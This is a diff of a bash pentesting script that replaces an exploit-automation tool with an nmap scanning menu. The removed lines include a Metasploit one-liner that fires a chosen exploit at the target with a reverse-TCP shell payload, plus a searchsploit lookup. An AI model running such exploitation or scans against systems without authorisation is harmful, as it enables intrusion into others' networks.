@@ -1,21 +1,21 @@
 #!/bin/bash
 
 # =========================================================
-# OMAP - Outstanding Multi-purpose Automated Pentester v3
+# OMAP - Full Power with nmap
 # by StGlz
 # contact: natone@riseup.net
 # visit my ws: https://www.stglz-ecke.digital
 # =========================================================
 # DESCRIPTION:
-# OMAP is a stylish, modular pentesting tool designed for flexibility.
-# Choose between simple scanning, exploit searching, OS detection,
-# or full automated exploitation using Exploit-DB and Metasploit.
-# Use it responsibly and ONLY on networks you own or have permission to test!
+# This script unleashes the full potential of Nmap, offering
+# all possible scans, stylish output, and powerful combinations
+# for pentesters and network enthusiasts. Use responsibly!
 # =========================================================
 
-# Colors for aesthetic
+# Colors for aesthetics
 RED=$(tput setaf 1)
 GREEN=$(tput setaf 2)
+YELLOW=$(tput setaf 3)
 BLUE=$(tput setaf 4)
 CYAN=$(tput setaf 6)
 BOLD=$(tput bold)
@@ -32,103 +32,112 @@ function loading_animation() {
     echo ""
 }
 
-# Fake progress bar
-function fake_progress() {
-    local message="$1"
-    echo -e "${BLUE}${BOLD}${message}${RESET}"
-    for i in $(seq 1 50); do
-        echo -ne "${GREEN}#${RESET}"
-        sleep 0.05
-    done
-    echo -e " ${CYAN}[DONE]${RESET}"
-}
-
-# Dependency check
-function check_dependencies() {
-    echo -e "${CYAN}Checking for required tools...${RESET}"
-    for tool in nmap searchsploit msfconsole; do
-        if ! command -v "$tool" &> /dev/null; then
-            echo -e "${RED}Error: ${tool} is not installed. Please install it and try again.${RESET}"
-            exit 1
+# Display results with style
+function display_result() {
+    echo -e "\n${YELLOW}${BOLD}=== RESULTS ===${RESET}"
+    echo -e "$1" | while IFS= read -r line; do
+        if [[ $line == *"open"* ]]; then
+            echo -e "${GREEN}${line}${RESET}"
+        elif [[ $line == *"closed"* || $line == *"filtered"* ]]; then
+            echo -e "${RED}${line}${RESET}"
+        else
+            echo -e "${CYAN}${line}${RESET}"
         fi
     done
-    echo -e "${GREEN}All tools are installed.${RESET}"
 }
 
-# Menu options
-function show_menu() {
-    echo -e "\n${CYAN}${BOLD}=== OMAP Menu ===${RESET}"
-    echo -e "${GREEN}1. Network Scan (basic or detailed).${RESET}"
-    echo -e "${GREEN}2. Scan + Exploit Search.${RESET}"
-    echo -e "${GREEN}3. OS Detection.${RESET}"
-    echo -e "${GREEN}4. Exploit Automation with Metasploit.${RESET}"
-    echo -e "${CYAN}Enter your choice (1-4): ${RESET}"
+# Basic scans
+function basic_scans() {
+    echo -e "${BLUE}${BOLD}=== Basic Scans ===${RESET}"
+    echo -e "${CYAN}1. Ping Scan${RESET}"
+    echo -e "${CYAN}2. Quick Scan (common ports)${RESET}"
+    echo -e "${CYAN}3. Full Scan (all ports)${RESET}"
+    echo -ne "${CYAN}Choose an option (1-3): ${RESET}"
     read CHOICE
-}
 
-# Network Scan
-function network_scan() {
-    echo -e "\n${CYAN}Choose scan type:${RESET}"
-    echo -e "${GREEN}1. Quick Scan (common ports).${RESET}"
-    echo -e "${GREEN}2. Full Scan (all ports).${RESET}"
-    echo -ne "${CYAN}Select an option (1-2): ${RESET}"
-    read SCAN_TYPE
-
-    case $SCAN_TYPE in
+    case $CHOICE in
     1)
-        echo -e "${CYAN}Performing Quick Scan...${RESET}"
-        nmap -F "$TARGET"
+        loading_animation "Performing Ping Scan"
+        result=$(nmap -sn "$TARGET")
         ;;
     2)
-        echo -e "${CYAN}Performing Full Scan...${RESET}"
-        nmap -p- "$TARGET"
+        loading_animation "Performing Quick Scan"
+        result=$(nmap -F "$TARGET")
+        ;;
+    3)
+        loading_animation "Performing Full Scan"
+        result=$(nmap -p- "$TARGET")
         ;;
     *)
         echo -e "${RED}Invalid option.${RESET}"
+        return
         ;;
     esac
+    display_result "$result"
 }
 
-# Scan + Exploit Search
-function scan_exploit_search() {
-    echo -e "\n${CYAN}Scanning for vulnerabilities on ${TARGET}...${RESET}"
-    nmap --script vuln "$TARGET" -oN vuln_scan.txt
+# Advanced scans
+function advanced_scans() {
+    echo -e "${BLUE}${BOLD}=== Advanced Scans ===${RESET}"
+    echo -e "${CYAN}1. OS Detection${RESET}"
+    echo -e "${CYAN}2. Service Version Detection${RESET}"
+    echo -e "${CYAN}3. Scan with Vulnerability Scripts${RESET}"
+    echo -ne "${CYAN}Choose an option (1-3): ${RESET}"
+    read CHOICE
 
-    echo -e "${GREEN}Scan complete. Searching for exploits...${RESET}"
-    while read -r vuln; do
-        echo -e "\n${BOLD}Possible exploits for: ${vuln}${RESET}"
-        searchsploit "$vuln"
-    done < <(grep "|_" vuln_scan.txt | cut -d '|' -f 2)
+    case $CHOICE in
+    1)
+        loading_animation "Detecting Operating System"
+        result=$(nmap -O "$TARGET")
+        ;;
+    2)
+        loading_animation "Detecting Service Versions"
+        result=$(nmap -sV "$TARGET")
+        ;;
+    3)
+        loading_animation "Scanning with Vulnerability Scripts"
+        result=$(nmap --script vuln "$TARGET")
+        ;;
+    *)
+        echo -e "${RED}Invalid option.${RESET}"
+        return
+        ;;
+    esac
+    display_result "$result"
 }
 
-# OS Detection
-function os_detection() {
-    echo -e "\n${CYAN}Detecting Operating System on ${TARGET}...${RESET}"
-    nmap -O "$TARGET"
-}
+# Combined scans
+function combined_scans() {
+    echo -e "${BLUE}${BOLD}=== Combined Scans ===${RESET}"
+    echo -e "${CYAN}1. Full Ports + OS Detection${RESET}"
+    echo -e "${CYAN}2. Full Scan + Vulnerability Scripts${RESET}"
+    echo -ne "${CYAN}Choose an option (1-2): ${RESET}"
+    read CHOICE
 
-# Exploit Automation
-function exploit_automation() {
-    echo -ne "${CYAN}Enter the Exploit-DB path for your target: ${RESET}"
-    read EXPLOIT
-
-    if [ -z "$EXPLOIT" ]; then
-        echo -e "${RED}No exploit provided. Exiting...${RESET}"
-        exit 1
-    fi
-
-    echo -e "${CYAN}Running Metasploit with exploit: ${EXPLOIT}${RESET}"
-    msfconsole -q -x "use $EXPLOIT; set RHOSTS $TARGET; set PAYLOAD generic/shell_reverse_tcp; exploit"
+    case $CHOICE in
+    1)
+        loading_animation "Performing Full Ports + OS Detection"
+        result=$(nmap -p- -O "$TARGET")
+        ;;
+    2)
+        loading_animation "Performing Full Scan + Vulnerability Scripts"
+        result=$(nmap -p- --script vuln "$TARGET")
+        ;;
+    *)
+        echo -e "${RED}Invalid option.${RESET}"
+        return
+        ;;
+    esac
+    display_result "$result"
 }
 
 # Main function
-function main() {
+function main_menu() {
     clear
-    echo -e "${CYAN}${BOLD}=== Welcome to OMAP v3 - Pentesting Your Way ===${RESET}"
-    echo -e "${GREEN}Modular, flexible, and stylish pentesting for all your needs.${RESET}"
+    echo -e "${CYAN}${BOLD}=== Welcome to the Ultimate Nmap Tool ===${RESET}"
+    echo -e "${GREEN}Unleash the full power of Nmap with style.${RESET}"
     echo -e "${RED}Reminder: Only scan networks you own or have permission to test.${RESET}\n"
 
-    # Ask for target IP
     echo -ne "${CYAN}Enter the target IP or range (e.g., 192.168.1.0/24): ${RESET}"
     read TARGET
 
@@ -137,28 +146,41 @@ function main() {
         exit 1
     fi
 
-    # Show menu and execute selected option
-    show_menu
-    case $CHOICE in
-    1)
-        network_scan
-        ;;
-    2)
-        scan_exploit_search
-        ;;
-    3)
-        os_detection
-        ;;
-    4)
-        exploit_automation
-        ;;
-    *)
-        echo -e "${RED}Invalid option. Exiting...${RESET}"
-        exit 1
-        ;;
-    esac
+    while true; do
+        echo -e "\n${CYAN}${BOLD}=== Main Menu ===${RESET}"
+        echo -e "${GREEN}1. Basic Scans${RESET}"
+        echo -e "${GREEN}2. Advanced Scans${RESET}"
+        echo -e "${GREEN}3. Combined Scans${RESET}"
+        echo -e "${GREEN}4. Exit${RESET}"
+        echo -ne "${CYAN}Choose an option (1-4): ${RESET}"
+        read OPTION
+
+        case $OPTION in
+        1)
+            basic_scans
+            ;;
+        2)
+            advanced_scans
+            ;;
+        3)
+            combined_scans
+            ;;
+        4)
+            echo -e "${CYAN}Exiting...${RESET}"
+            exit 0
+            ;;
+        *)
+            echo -e "${RED}Invalid option.${RESET}"
+            ;;
+        esac
+    done
 }
 
-# Check dependencies and run the main program
-check_dependencies
-main
+# Check if Nmap is installed
+if ! command -v nmap &>/dev/null; then
+    echo -e "${RED}Error: Nmap is not installed. Please install it and try again.${RESET}"
+    exit 1
+fi
+
+# Run the main menu
+main_menu
